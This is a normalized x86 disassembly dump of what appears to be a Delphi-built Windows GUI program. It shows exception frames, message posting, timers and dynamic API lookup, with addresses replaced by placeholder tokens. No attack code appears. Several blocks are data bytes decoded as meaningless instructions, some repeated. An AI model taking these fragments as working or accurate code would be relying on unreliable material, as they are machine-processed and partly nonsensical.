cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x20c ]
call sub_464a38
retn
sub_465945
jmp sub_403924
sub_46594c
mov eax [ ebp - 0x4 ]
call sub_453d8c
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4646a0
mov eax [ ebp - 0x4 ]
call sub_465420
sub_465a80
jmp sub_403924
sub_465ab8
jmp sub_403924
sub_465abf
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465adf
lea eax [ ebp - 0x114 ]
call sub_403f20
retn
sub_465ad8
jmp sub_403924
sub_465adf
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_465de6
jmp sub_403924
sub_465ded
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403544
sub_465e41
jmp sub_403670
j_sub_403670#4
jmp sub_403670
sub_465ec2
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46d2bc
call sub_4039d8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46627a
jmp sub_403924
sub_466281
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46635c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41c9e0
mov [ ebx + 0x270 ] eax
pop esi
pop ebx
retn
sub_466374
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4663ac
mov edx eax
mov eax esi
call sub_41ebd0
pop esi
pop ebx
retn
sub_466390
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_467750
mov edx eax
mov eax esi
call sub_41ebd0
pop esi
pop ebx
retn
sub_4663ac
push ebx
mov ebx eax
mov eax ebx
call sub_4673f0
mov edx r-xdata
call sub_424888
pop ebx
retn
sub_4664b0
push ebx
mov ebx eax
mov eax ebx
call sub_4664c0
xor al 0x1
pop ebx
retn
sub_4664c0
cmp [ eax + 0x210 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x208 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ eax + 0x20c ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
sub_46651c
push ebx
cmp [ eax + 0x292 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x294 ]
call [ ebx + 0x290 ]
sub_46653c
push ebx
cmp [ eax + 0x2b2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_46655c
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_466855
jmp sub_403924
sub_46685c
pop ecx
pop ebp
retn
sub_466860
xor eax eax
retn
sub_466b38
jmp sub_403924
sub_466b3f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403190
retn
sub_466b55
jmp sub_403924
sub_466c3f
jmp sub_403924
sub_466c46
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466c63
mov eax [ ebp - 0xc ]
call sub_403190
retn
sub_466c5c
jmp sub_403924
sub_466c83
jmp sub_403924
sub_466f6e
jmp sub_403924
sub_467101
jmp sub_403924
sub_4673f0
mov eax [ eax + 0x238 ]
retn
sub_4673f8
mov eax [ eax + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_467404
mov al [ eax + 0x5e ]
xor al 0x1
retn
sub_467742
jmp sub_403924
sub_467749
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_467750
mov eax [ eax + 0x25c ]
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
sub_467798
cmp dl [ eax + 0x230 ]
je r-xdata
retn
mov [ eax + 0x230 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_451028
sub_4677b4
cmp [ eax + 0x25c ] 0x0
setne al
retn
sub_4677f0
push ebx
mov ebx eax
mov eax ebx
call sub_452fbc
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_42420c
sub_467874
push ebx
mov ebx eax
mov eax ebx
call sub_452fe4
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_42492c
sub_467894
push ebx
mov ebx eax
mov eax ebx
call sub_4674b4
mov edx [ ebx + 0x248 ]
mov eax ebx
call sub_46757c
pop ebx
retn
sub_4680c1
lea eax [ ebp - 0xb4 ]
call sub_403f20
retn
sub_4680cd
jmp sub_403924
j_sub_4680c1
jmp sub_4680c1
sub_4680d4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46822c
jmp sub_403924
sub_468233
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_468518
jmp sub_403924
sub_46851f
mov eax [ rw-data ]
call sub_46add0
mov bl 0x1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_468536
add [ eax ] al
retn
sub_468794
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_4687b4
mov eax [ eax + 0x240 ]
call sub_429ff4
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
call sub_46cb70
sub_46885b
jmp sub_403924
sub_468862
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468885
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_424904
retn
sub_46887e
jmp sub_403924
sub_468885
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_468a44
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4687b4
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_468cac
mov ecx [ eax + 0x248 ]
test ecx ecx
je r-xdata
retn
mov edx [ edx + 0x4 ]
mov eax ecx
call sub_460ab4
sub_468d97
jmp sub_403924
sub_468d9e
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_468da4
cmp [ eax + 0x22f ] 0x2
jne r-xdata
cmp [ edx + 0x4 ] 0x0
setne dl
call sub_46858c
test [ eax + 0x1c ] 0x10
je r-xdata
retn
sub_468dfc
call sub_469b24
retn
sub_469249
jmp sub_403924
sub_469250
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46954c
jmp sub_403670
sub_4698e8
jmp sub_403670
sub_4699e1
jmp sub_403924
sub_4699e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469a05
lea eax [ ebp - 0x8 ]
call sub_403f20
retn
sub_4699fe
jmp sub_403924
sub_469a05
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_469a0c
push ebx
mov ebx eax
mov eax [ ebx + 0x240 ]
call sub_429ff4
test eax eax
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_466454
sub_469a2c
call sub_403190
retn
sub_469a84
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_469aea
jmp sub_403924
j_sub_403670#8
jmp sub_403670
sub_469cc4
xor edx edx
call sub_4667b8
retn
sub_469ccc
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_4667b8
mov eax ebx
call sub_44d3ec
pop ebx
retn
sub_469d52
jmp sub_403924
sub_469d59
pop ebx
pop ecx
pop ebp
retn
sub_469d60
push ebx
mov ebx eax
push 0x0
push 0x0
push 0xb021
mov eax ebx
call sub_453a88
push eax
call PostMessageA
pop ebx
retn
sub_469f64
jmp sub_403924
sub_46a005
jmp sub_403924
sub_46a00f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a02e
mov eax [ rw-data ]
call sub_46c248
retn
sub_46a027
jmp sub_403924
sub_46a02e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a04b
lea eax [ ebp - 0x20 ]
call sub_403f20
retn
sub_46a044
jmp sub_403924
sub_46a04b
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46a12c
cmp [ eax + 0x30 ] 0x0
jne r-xdata
call sub_44c598
retn
mov edx eax
mov eax [ rw-data ]
call sub_46b89c
retn
sub_46a4b0
mov edx eax
mov eax [ rw-data ]
call sub_46d2bc
mov al 0x1
retn
sub_46a598
cmp dl [ eax + 0x2e0 ]
je r-xdata
retn
mov [ eax + 0x2e0 ] dl
call sub_46a4c0
sub_46a5ac
cmp dl [ eax + 0x2e1 ]
je r-xdata
retn
mov [ eax + 0x2e1 ] dl
call sub_46a4c0
sub_46a5c0
cmp edx [ eax + 0x2ec ]
je r-xdata
retn
mov [ eax + 0x2ec ] edx
call sub_46a4c0
sub_46a5d4
cmp dl [ eax + 0x2e8 ]
je r-xdata
retn
mov [ eax + 0x2e8 ] dl
call sub_46a4c0
sub_46a5e8
test [ eax + 0x1c ] 0x10
jne r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ eax + 0x2e0 ] 0x0
jne r-xdata
or [ edx + 0x8 ] 0x80000
cmp [ eax + 0x2e8 ] 0x0
je r-xdata
sub_46a753
jmp sub_403924
sub_46a75a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46a760
push ebx
mov ebx eax
mov eax ebx
call sub_4523a0
mov eax ebx
call sub_452524
test eax eax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_469d60
sub_46a9d6
jmp sub_403924
sub_46a9dd
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46a9e4
push ebx
mov ebx edx
mov edx ebx
call sub_452808
mov eax [ ebx + 0x8 ]
xor edx edx
call sub_44c6a0
pop ebx
retn
sub_46aa38
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_46aaa0
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_46aa50
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_46aaa0
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_46aa6c
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_46aaa0
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_46aa84
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_46aaa0
mov eax [ esp + 0x8 ]
sub eax [ esp ]
add esp 0x10
pop ebx
retn
sub_46ad20
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46ad2c
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46ad38
push 0x4d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46ad44
push 0x4c
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46ad50
push 0x4f
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46ad5c
push 0x4e
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46ad68
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x58 ]
call sub_418470
pop esi
pop ebx
retn
sub_46ad7c
mov edx [ eax + 0x58 ]
mov edx [ edx + 0x8 ]
test edx edx
jne r-xdata
mov eax edx
retn
push 0x50
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46ad98
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_418470
pop esi
pop ebx
retn
sub_46adac
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x8 ]
retn
sub_46adb4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418470
pop esi
pop ebx
retn
sub_46adc8
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
retn
sub_46aea4
mov eax [ eax + 0x54 ]
call sub_418314
retn
sub_46aeb0
mov eax [ eax + 0x54 ]
call sub_41860c
retn
sub_46b103
jmp sub_403924
sub_46b147
jmp sub_403924
sub_46b14e
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_46b19c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_46af9c
mov eax esi
mov edx [ ebx + 0x38 ]
call sub_403f74
pop esi
pop ebx
retn
sub_46b208
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x54 ]
call sub_418470
pop esi
pop ebx
retn
sub_46b21c
mov eax [ eax + 0x54 ]
mov eax [ eax + 0x8 ]
retn
sub_46b421
jmp sub_403924
sub_46b428
pop ebx
mov esp ebp
pop ebp
retn
sub_46b430
inc [ eax + 0x8c ]
retn
sub_46b438
dec [ eax + 0x8c ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
retn
test [ eax + 0x8e ] 0x10
je r-xdata
call sub_46b458
sub_46b458
xor edx edx
call sub_46b89c
retn
sub_46b88e
jmp sub_403924
sub_46b915
jmp sub_403924
sub_46b924
add eax 0x30
call sub_40d1d0
retn
sub_46b968
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x99 ] 0x0
je r-xdata
retn
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ eax + 0x30 ]
xor eax eax
sub_46b9b9
jmp sub_403670
sub_46b9be
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_46d2bc
call sub_4039d8
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_46c08d
jmp sub_403924
sub_46c094
pop ebx
mov esp ebp
pop ebp
retn
sub_46c21c
push ebx
inc [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x1
jne r-xdata
pop ebx
retn
cmp [ eax + 0xe2 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_46c248
push ebx
dec [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0xea ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_46c274
xor edx edx
call sub_46c16c
retn
sub_46c27c
mov dl 0x1
call sub_46c16c
retn
sub_46c2f0
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_46c308
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x1
je r-xdata
mov al 0x1
retn
sub_46c3d5
jmp sub_403924
sub_46c3dc
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46cb26
jmp sub_403670
sub_46d124
push ebx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop ebx
retn
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
j_sub_403670#3
jmp sub_403670
j_sub_403670#2
jmp sub_403670
sub_46d29a
jmp sub_403924
sub_46d2a1
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46d2a8
call sub_40cd20
test al al
je r-xdata
retn
push 0x0
call PostQuitMessage
sub_46d4a1
jmp sub_403924
sub_46d4a8
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46d56f
jmp sub_403924
sub_46d576
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46d74c
jmp sub_403924
sub_46d753
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46d7b4
jmp sub_403924
sub_46d7bb
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46d7c4
call sub_46d58c
retn
j_sub_403670
jmp sub_403670
sub_46da08
jmp sub_403924
sub_46da0f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46db3d
jmp sub_403924
sub_46dc9c
push ebx
mov ebx eax
mov ax [ ebx + 0x8a ]
test ax ax
je r-xdata
pop ebx
retn
movzx eax ax
push eax
push 0x0
call KillTimer
mov [ ebx + 0x8a ] 0x0
sub_46df9b
jmp sub_403924
sub_46dfca
jmp sub_403924
sub_46e0d6
jmp sub_403924
sub_46e0dd
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46e46e
jmp sub_403924
sub_46e475
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46e598
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_46e5e3
add [ edx ] ch
push 0x0
push 0x0
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
retn
sub_46e5f4
mov edx [ rw-data ]
mov [ edx + 0x4 ] eax
mov [ edx ] r-xdata
retn
sub_46e604
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
retn
sub_46e677
jmp sub_403924
sub_46e67e
pop ebp
retn
sub_46e680
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_46e614
call sub_403cf4
call sub_46e598
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
mov eax sub_464344
call sub_417dd8
sub_46e78a
inc esp
add [ eax + edi + 0x39780045 ] bh
inc ebp
add [ eax + 0x5c0046f6 ] bl
cmp [ ebp ] eax
hlt
sub_46ed02
inc esp
add [ esp + esi * 8 + 0x44 ] al
add [ eax - 0x6bffbbe6 ] bh
lds eax [ eax + eax - 0x18 ]
rol [ eax + eax + 0x60 ] 0x1
rol [ eax + eax + 0x74 ] 0x1
rol [ eax + eax + 0x20 ] cl
rol [ eax + eax - 0x64 ] cl
adc al 0x45
add al cl
hlt
sub_46ed26
inc esp
add [ eax + edi + 0x39780045 ] bh
inc ebp
add [ esp + esi + 0x45 ] dh
add [ ecx + edi + 0x45 ] bl
add ah dh
cli
inc esp
add [ eax + 0x28004501 ] cl
cmovne eax [ eax ]
hlt
sub_46f442
inc esp
add [ eax - 0x35 ] bh
inc esp
add [ eax + 0x180044d4 ] ah
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x18 ]
hlt
sub_46f9b8
mov eax [ eax + 0x208 ]
call sub_433618
retn
sub_46fa1b
add [ ebx + 0x20880 ] cl
add al ch
adc eax 0xc3fffc3c
mov eax [ eax + 0x208 ]
call sub_433648
retn
sub_46fa34
mov eax [ eax + 0x20c ]
call sub_433618
retn
sub_46fa99
add [ eax ] al
add [ ebx + 0x20c80 ] cl
add al ch
xchg ebp eax
cmp edi esp
inc ebx
mov eax [ eax + 0x20c ]
call sub_433648
retn
sub_46fbe8
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_46fd10
push ebx
mov ebx eax
mov eax ebx
call sub_442020
mov eax ebx
call sub_46fd24
pop ebx
retn
sub_46ff14
push esi
mov esi eax
cmp [ esi + 0x230 ] 0x0
je r-xdata
pop esi
retn
cmp [ esi + 0x20e ] 0x0
jne r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_46ff34
push esi
mov esi eax
cmp [ esi + 0x230 ] 0x0
je r-xdata
pop esi
retn
cmp [ esi + 0x20e ] 0x0
jne r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_46ffdc
jmp sub_403670
sub_470005
jmp sub_403924
sub_47000c
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_470062
jmp sub_403924
sub_470069
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4701f9
jmp sub_403670
sub_4701fe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x188 ]
xor edx edx
call sub_42fb08
call sub_403984
call sub_4039d8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4702ad
jmp sub_403924
sub_4702b4
pop ebp
retn
sub_4702b8
sub [ rw-data ] 0x1
retn
sub_4706de
jmp sub_403924
sub_4706e5
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_47085d
jmp sub_403924
sub_470864
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4708b1
jmp sub_403924
sub_4708b8
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_470ac9
jmp sub_403924
sub_470ad0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_470ca2
jmp sub_403924
sub_470ca9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_470cd9
jmp sub_403924
sub_470ce0
pop ebp
retn
sub_470ce4
sub [ rw-data ] 0x1
retn
sub_470dea
inc esp
add [ esp + esi * 8 + 0x44 ] al
add [ eax - 0x6bffbbe6 ] bh
lds eax [ eax + eax - 0x18 ]
rol [ eax + eax + 0x60 ] 0x1
rol [ eax + eax + 0x74 ] 0x1
rol [ eax + eax + 0x20 ] cl
rol [ eax + eax - 0x64 ] cl
adc al 0x45
add al cl
hlt
sub_470e0e
inc esp
add [ eax + edi + 0x39780045 ] bh
inc ebp
add [ esp + esi + 0x45 ] dh
add [ ecx + edi + 0x45 ] bl
add ah dh
cli
inc esp
add [ eax + 0x28004501 ] cl
cmovne eax [ eax ]
hlt
sub_470fce
inc esp
add [ esp + esi * 8 + 0x44 ] al
add [ eax - 0x6bffbbe6 ] bh
lds eax [ eax + eax - 0x18 ]
rol [ eax + eax + 0x60 ] 0x1
rol [ eax + eax + 0x74 ] 0x1
rol [ eax + eax + 0x20 ] cl
rol [ eax + eax - 0x64 ] cl
adc al 0x45
add al cl
hlt
sub_470ff2
inc esp
add [ eax + edi + 0x39780045 ] bh
inc ebp
add [ esp + esi + 0x45 ] dh
add [ ecx + edi + 0x45 ] bl
add ah dh
cli
inc esp
add [ eax + 0x28004501 ] cl
cmovne eax [ eax ]
hlt
sub_4719cc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44e810
movsx eax [ esi + 0x8 ]
mov [ ebx + 0x234 ] eax
pop esi
pop ebx
retn
sub_471a48
push ebx
mov ebx eax
mov eax ebx
call sub_4521bc
mov eax ebx
call sub_471d98
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_472228
sub_471ac4
jmp sub_403924
sub_471acb
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_471b68
jmp sub_403924
sub_471b6f
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_471c6e
jmp sub_403924
sub_471c75
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_471d8a
jmp sub_403924
sub_471d91
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_471d98
push ebx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
setne al
pop ebx
retn
sub_471e5d
jmp sub_403924
sub_471e64
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_471f38
mov eax [ eax + 0x208 ]
retn
sub_472186
jmp sub_403924
sub_472218
jmp sub_403924
sub_47221f
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_472268
xor edx edx
call sub_471b78
retn
sub_472270
mov al 0x1
retn
sub_472461
jmp sub_403924
sub_472468
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47264e
jmp sub_403924
sub_472655
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_472694
push ebx
mov ebx eax
mov eax edx
dec eax
mov edx eax
mov eax ebx
call sub_4726d8
mov edx eax
mov eax ebx
call sub_471fb8
pop ebx
retn
j_sub_403924#9
jmp sub_403924
sub_4728ef
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47297b
jmp sub_403924
sub_472982
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_403924#8
jmp sub_403924
sub_472a10
pop ebx
mov esp ebp
pop ebp
retn
sub_472b16
jmp sub_403924
sub_472b1d
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
j_sub_403924#7
jmp sub_403924
sub_472d75
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_472e18
mov edx [ rw-data ]
cmp [ edx + 0x4 ] 0x11
jne r-xdata
xor eax eax
retn
add al 0x5f
sub al 0x3f
jb r-xdata
mov al 0x1
retn
sub_472efe
jmp sub_403924
sub_472f05
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
j_sub_403924#6
jmp sub_403924
sub_4731c9
mov al [ ebp - 0x9 ]
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403924#5
jmp sub_403924
sub_4735e3
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
j_sub_403924#4
jmp sub_403924
sub_473678
pop ebp
retn
sub_47367c
sub [ rw-data ] 0x1
retn
sub_474241
jmp sub_403924
sub_474248
pop ecx
pop ebp
retn
sub_47424c
and eax 0xff
shl eax 0x10
and edx 0xff
or eax edx
retn
sub_474260
shr eax 0x10
retn
sub_474264
and eax 0xff
retn
sub_47426c
xor eax eax
retn
sub_4743d8
push ebx
mov ebx edx
mov edx ebx
call sub_445ce8
test [ ebx + 0x4 ] 0x30
jne r-xdata
pop ebx
retn
or [ ebx + 0x4 ] 0x10
sub_4743fc
push ebx
mov ebx eax
mov eax ebx
call sub_452fe4
mov eax ebx
call sub_474410
pop ebx
retn
j_sub_403924#3
jmp sub_403924
sub_474b4c
push ebx
cmp [ eax + 0x28a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_474c10
call sub_445400
retn
sub_474c18
call sub_445420
retn
sub_474c48
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_474bb4
test eax eax
setne al
pop esi
pop ebx
retn
sub_474d00
cmp dl [ eax + 0x281 ]
je r-xdata
retn
mov [ eax + 0x281 ] dl
mov edx [ eax ]
call [ edx + 0x7c ]
sub_474d7c
cmp edx [ eax + 0x298 ]
je r-xdata
retn
mov [ eax + 0x298 ] edx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_474d90
cmp edx [ eax + 0x294 ]
je r-xdata
retn
mov [ eax + 0x294 ] edx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_474dc9
jmp sub_403924
sub_474dd0
pop ebp
retn
sub_474dd4
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_4741c8
sub_475135
jmp sub_403924
sub_47513c
pop ebp
retn
j_sub_403924#2
jmp sub_403924
sub_475362
pop esi
pop ebx
pop ebp
retn
sub_4753d2
retn
j_sub_403924
jmp sub_403924
j_sub_4753d2
jmp sub_4753d2
sub_4753da
pop ebp
retn
